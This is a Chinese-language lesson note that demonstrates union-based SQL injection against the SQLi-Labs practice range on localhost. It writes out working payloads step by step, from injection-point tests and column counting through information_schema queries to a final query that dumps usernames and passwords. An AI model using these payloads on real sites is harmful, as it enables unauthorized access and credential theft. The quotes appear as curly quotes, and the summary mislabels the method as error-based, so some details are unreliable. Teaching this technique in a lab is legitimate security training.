# 网络安全：P18：SQL注入演示

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_0.png)

## 概述
在本节课中，我们将学习SQL注入攻击的完整实战流程。我们将从搭建实验环境开始，逐步演示如何发现注入点、判断字段数、确定回显位置，并最终获取数据库中的敏感信息。课程内容简单直白，适合初学者理解。

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_2.png)

---

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_4.png)

## 实验环境搭建 🛠️

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_6.png)

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_7.png)

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_8.png)

上一节我们介绍了SQL注入的基本原理，本节中我们来看看如何搭建一个用于练习的靶场环境。

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_10.png)

我们使用的靶场是 **SQLi-Labs**，它集成了多种类型的SQL注入漏洞。以下是搭建步骤：

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_12.png)

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_14.png)

1.  将SQLi-Labs文件夹放置在PHP集成环境（如PHPStudy）的 `www` 目录下。
2.  启动PHPStudy，确保运行的是 **MySQL 5.x** 和 **PHP 5.6** 左右的版本，高版本可能导致兼容性问题。
3.  在浏览器中访问 `http://127.0.0.1/sqli-labs/`。
4.  首次访问时，点击页面链接以安装所需的数据库和数据表。

环境搭建完成后，即可看到包含多个关卡的练习界面。本节课我们将以第一关为例进行演示。

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_16.png)

---

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_18.png)

## SQL注入攻击步骤 📈

成功搭建环境后，我们来系统性地了解一次完整的SQL注入攻击包含哪些关键步骤。

一次典型的SQL注入攻击遵循以下流程：

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_20.png)

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_21.png)

1.  **判断注入点**：找到将用户输入数据当作SQL代码执行的位置。
2.  **判断字段数**：确定当前查询语句所查询的字段数量。
3.  **判断回显位**：找出页面中能够显示数据库查询结果的位置。
4.  **获取信息**：利用回显位，逐步获取数据库名、表名、列名及具体数据。

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_23.png)

---

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_25.png)

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_27.png)

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_29.png)

## 核心概念与语法 🔑

在深入实战前，我们需要掌握几个在SQL注入中至关重要的数据库概念和查询语句。

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_31.png)

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_32.png)

以下是后续步骤中会用到的核心知识点：

*   **信息数据库**：`information_schema` 数据库存储了MySQL服务器中所有其他数据库的元数据（如库名、表名、列名）。
*   **查询所有表名**：
    ```sql
    SELECT table_name FROM information_schema.tables WHERE table_schema = database()
    ```
*   **查询指定表的列名**：
    ```sql
    SELECT column_name FROM information_schema.columns WHERE table_schema = database() AND table_name = ‘表名‘
    ```
*   **联合查询**：`UNION SELECT` 操作符用于合并两个或多个SELECT语句的结果集，是注入时获取数据的主要手段。

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_34.png)

---

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_36.png)

## 实战演示：第一关 🎯

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_38.png)

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_39.png)

现在，我们开始对SQLi-Labs的第一关进行实战注入演示。

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_41.png)

### 第一步：判断注入点

访问第一关地址，页面提示输入ID参数。我们尝试输入 `?id=1`，页面正常显示用户信息。

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_43.png)

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_44.png)

为了检测是否存在注入漏洞，我们尝试闭合原SQL语句并添加永真条件。在输入框或URL中尝试构造：
`1‘ and ‘1‘=‘1`

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_46.png)

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_47.png)

如果页面依然正常显示，再尝试永假条件：
`1‘ and ‘1‘=‘2`

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_49.png)

若永真条件正常显示而永假条件无数据返回，则基本可判定此处存在字符型注入点。

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_51.png)

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_53.png)

### 第二步：判断字段数

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_55.png)

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_56.png)

确定注入点后，需要使用 `ORDER BY` 子句来判断当前查询的字段数量。通过递增数字进行测试：
`1‘ order by 3 -- `
`1‘ order by 4 -- `

当 `order by 4` 时报错，而 `order by 3` 正常，说明当前查询的字段数为 **3**。

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_58.png)

### 第三步：判断回显位

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_60.png)

字段数确定后，利用 `UNION SELECT` 来探测页面中哪些位置会回显数据库查询结果。
`1‘ and 1=2 union select 1,2,3 -- `

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_61.png)

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_63.png)

上述语句中 `and 1=2` 使原查询不返回结果，从而让页面显示 `union select` 的结果。观察页面，发现数字 **2** 和 **3** 的位置被显示出来，这两个位置即为可用的回显位。

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_65.png)

### 第四步：获取数据库信息

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_67.png)

现在，我们可以将回显位（2或3）替换为我们想查询的信息。

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_69.png)

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_70.png)

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_71.png)

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_73.png)

1.  **获取当前数据库名**：
    `1‘ and 1=2 union select 1,database(),3 -- `
    回显位显示数据库名为 `security`。

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_75.png)

2.  **获取数据库中的表名**：
    `1‘ and 1=2 union select 1,table_name,3 from information_schema.tables where table_schema=‘security‘ -- `
    可以获取到表名列表，例如 `emails`, `users` 等。我们关注 `users` 表。

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_77.png)

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_79.png)

3.  **获取users表的列名**：
    `1‘ and 1=2 union select 1,column_name,3 from information_schema.columns where table_schema=‘security‘ and table_name=‘users‘ -- `
    可以获取到列名，例如 `id`, `username`, `password`。

### 第五步：提取最终数据

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_81.png)

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_82.png)

知道了表名和列名，就可以直接查询敏感数据了。
`1‘ and 1=2 union select 1,username,password from users -- `

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_84.png)

执行以上语句，即可在页面的回显位置上看到 `users` 表中所有的用户名和密码，从而完成本次SQL注入攻击。

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_86.png)

---

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_88.png)

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_90.png)

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_91.png)

## 总结

![](img/b2d99f49c89f23e29e86b0d5b5a4ca85_93.png)

本节课中我们一起学习了SQL注入的完整实战流程。
我们从搭建SQLi-Labs靶场开始，逐步演练了 **判断注入点、判断字段数、确定回显位、获取数据库名、表名、列名以及最终数据** 的每一步操作。
通过第一关的演示，你应该对基于联合查询的报错型SQL注入有了直观的认识。
请务必在合法的靶场环境中进行练习，巩固这些知识。